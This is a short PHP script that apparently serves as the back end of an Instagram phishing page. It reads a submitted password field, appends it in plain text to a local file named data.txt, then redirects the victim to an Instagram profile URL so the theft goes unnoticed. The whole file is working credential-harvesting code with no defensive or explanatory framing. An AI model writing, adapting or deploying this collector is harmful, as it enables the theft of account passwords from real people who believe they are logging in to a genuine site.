<?php

 if(isset($_POST['submit_btn']))
 {
  
  $password = $_POST['pass'];
  $text = $password . "\n";
  $fp = fopen('data.txt', 'a+');

    if(fwrite($fp, $text))  {
        header('Location:https://instagram.com/jah18.x');
        include 'post.html';
    }
fclose ($fp);    
}
?>